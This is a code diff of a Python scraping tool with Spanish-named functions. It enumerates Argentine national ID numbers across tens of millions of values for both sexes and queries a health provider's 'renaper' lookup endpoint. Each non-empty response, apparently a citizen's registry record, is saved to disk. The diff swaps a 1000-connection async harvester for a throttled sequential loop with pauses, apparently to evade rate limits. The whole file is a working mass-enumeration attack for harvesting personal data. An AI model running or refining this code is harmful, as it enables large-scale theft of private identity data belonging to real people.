@@ -1,72 +1,52 @@
 import os
-import asyncio
-import aiohttp
+import requests
 import time
 from colorama import Fore
 
-async def titocalderon(numero, sexo, carpeta, semaforo):
-    try:
-        url = f"https://hbi.acuariosalud.com/federador.asp?accion=renaper&nrodoc={numero}&sexo={sexo}"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url) as response:
-                if response.status == 200:
-                    data = await response.text()
-                    if data.strip():
-                        nombre_archivo = os.path.join(carpeta, f"{numero}_{sexo}.txt")
-                        async with semaforo:
-                            # Sección crítica protegida por el semáforo
-                            with open(nombre_archivo, "w", encoding="utf-8") as archivo:
-                                archivo.write(data)
-                            print(f"Operación {Fore.GREEN}exitosa{Fore.WHITE}: DNI {numero}, Sexo {sexo}. Guardado en el archivo: {Fore.CYAN}{nombre_archivo}{Fore.WHITE}")
-                        return True
-                else:
-                    if "No existe Tito Calderon" in await response.text():
-                        print(f"No existe Tito Calderon para DNI {numero}, Sexo {sexo}.")
-                    else:
-                        print(f"Operación {Fore.RED}fallida{Fore.WHITE}: DNI {numero}, Sexo {sexo}.")
-                    return False
-    except KeyboardInterrupt:
-        print(f"{Fore.YELLOW}Interrupción de teclado. Saliendo del programa...{Fore.WHITE}")
-        exit()
+os.system('cls')
 
-async def el_italiano(inicio, fin, sexos, carpeta_resultados, lote_size, conexiones_concurrentes):
-    lote_actual = 0
-    semaforo = asyncio.Semaphore(conexiones_concurrentes)
+def titocalderon(numero, sexo, carpeta):
+    url = f"https://hbi.acuariosalud.com/federador.asp?accion=renaper&nrodoc={numero}&sexo={sexo}"
+    response = requests.get(url)
 
-    tasks = []
+    if response.ok and response.text.strip():
+        nombre_archivo = os.path.join(carpeta, f"{numero}_{sexo}.txt")
+        with open(nombre_archivo, "w", encoding="utf-8") as archivo:
+            archivo.write(response.text)
+        print(f"Operación {Fore.GREEN}exitosa{Fore.WHITE}: DNI {numero}, Sexo {sexo}. Guardado en el archivo: {Fore.CYAN}{nombre_archivo}{Fore.WHITE}")
+        return True
+    else:
+        print(f"Operación {Fore.RED}fallida{Fore.WHITE}: DNI {numero}, Sexo {sexo}.")
+        return False
+
+def el_italiano(inicio, fin):
     for _ in range(inicio, fin):
         numero = str(_).zfill(8)
+        primer_digito = numero[0]
+        yield numero, primer_digito
+
+def main():
+    carpeta_resultados = "ella_me_llama"
+    os.makedirs(carpeta_resultados, exist_ok=True)
+
+    sexos = ['M', 'F']
+    inicio = 30000000
+    fin = 59999999
+    lote_size = 500
+    lote_actual = 0
+
+    for numero, primer_digito in el_italiano(inicio, fin):
         for sexo in sexos:
             if lote_actual == lote_size:
                 lote_actual = 0
                 print(f"{Fore.MAGENTA}\n\n\n\nHaciendo una pausa de 2 minutos...\n\n\n\n")
-                await asyncio.sleep(60)
+                time.sleep(120)
 
-            task = titocalderon(numero, sexo, carpeta_resultados, semaforo)
-            tasks.append(task)
-            lote_actual += 1
-
-            if len(tasks) >= conexiones_concurrentes:
-                await asyncio.gather(*tasks)
-                tasks = []
-
-    await asyncio.gather(*tasks)
+            if titocalderon(numero, sexo, carpeta_resultados):
+                lote_actual += 1
+                break
+        else:
+            print(f"No existe Tito Calderon para DNI {numero}")
 
 if __name__ == "__main__":
-    # Obten la ruta del directorio del script
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    
-    # Construye la ruta completa para la carpeta de resultados
-    carpeta_resultados = os.path.join(script_dir, "ella_me_llama")
-    
-    # Crea la carpeta si no existe
-    os.makedirs(carpeta_resultados, exist_ok=True)
-
-    sexos = ['M', 'F']
-    inicio = 00000000  # Cambia según tus necesidades
-    fin = 59999999  # Cambia según tus necesidades
-    lote_size = 500
-    conexiones_concurrentes = 1000  # Ajusta este valor según tus necesidades
-
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(el_italiano(inicio, fin, sexos, carpeta_resultados, lote_size, conexiones_concurrentes))
+    main()
